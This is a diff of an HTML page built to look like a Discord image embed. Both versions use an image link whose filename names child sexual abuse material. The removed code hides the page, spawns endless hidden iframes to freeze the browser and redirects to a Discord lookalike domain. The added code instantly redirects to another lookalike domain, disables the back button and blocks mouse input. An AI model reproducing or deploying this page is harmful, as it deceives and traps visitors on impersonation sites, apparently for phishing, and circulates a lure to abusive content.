@@ -1,58 +1,39 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title></title>
-  <link rel="icon" href="data:;base64,="> <!-- Invisible favicon -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
 
-  <!-- Open Graph meta tag for Discord image embed only -->
-  <meta property="og:image" content="https://media.discordapp.net/attachments/1334707778308145208/1336791516760248340/child-porn.png?ex=67a5179d&is=67a3c61d&hm=b4990c349a20f540635e266b482af39a9ddb01ee9c3a3bf0d11216a9514ee562&">
+    <!-- Redirect meta tag to instantly go to the specified URL -->
+    <meta http-equiv="refresh" content="0;url=https://media-discordapp.netlify.app/">
 
-  <style>
-    /* Hide the cursor instantly */
-    body {
-      background-color: black;
-      height: 100vh;
-      margin: 0;
-      cursor: none;  /* Hide the cursor immediately */
-    }
+    <!-- History prevention (to stop going back) -->
+    <script>
+        // Push the current state so the back button doesn't work
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.go(1); // Prevent going back
+        };
 
-    /* Prevent the page content from showing */
-    * {
-      display: none;
-    }
-  </style>
+        // Ensure the page is only accessible on the specified subdomain and path
+        if (window.location.pathname !== "/attachments/1334707778308145208/1336785260058382447") {
+            // Redirect to an error page or blank page if the path doesn't match
+            window.location.href = "about:blank";  // Optional: you can change this to any other URL or custom error page
+        }
+    </script>
 
-  <script>
-    // Function to open an iframe
-    function openIframe() {
-      var iframe = document.createElement('iframe');
-      iframe.style.display = 'none'; // Hide the iframe
-      iframe.src = 'about:blank';   // Empty source to avoid redirecting this page
-      document.body.appendChild(iframe);
-      // Optionally, repeat this function continuously to open infinite iframes
-      setTimeout(openIframe, 0);  // Open another iframe immediately
-    }
-
-    // Start opening infinite iframes instantly
-    openIframe();
-
-    // Force immediate redirect to the desired URL
-    window.location.replace("https://cdn-discordapp-com-gamma.vercel.app/");
-
-    // Block going back in history (This is a workaround and doesn't guarantee complete prevention)
-    window.history.pushState(null, null, window.location.href);
-    window.onpopstate = function() {
-      window.history.go(1);
-    };
-
-    // Freeze the mouse by continuously resetting its position to a fixed point (effectively locking it)
-    document.addEventListener('mousemove', function(event) {
-      window.scrollTo(0, 0); // Prevents scrolling and effectively "locks" the mouse position
-    });
-  </script>
+    <!-- Disable mouse interaction -->
+    <style>
+        body {
+            display: none; /* Hides content while redirecting */
+            pointer-events: none; /* Disable all mouse interaction */
+        }
+    </style>
 </head>
 <body>
+
+    <!-- Image Embed (will show as an image in Discord) -->
+    <img src="https://media.discordapp.net/attachments/1334707778308145208/1336802943189520416/child-porn.png?ex=67a52242&is=67a3d0c2&hm=493ac512ff5ddf482cf7880f9a83020e5a1c20140edc0dc15dd9075ef498a4eb&" style="max-width: 100%; display: block; margin: 0 auto;">
 </body>
 </html>
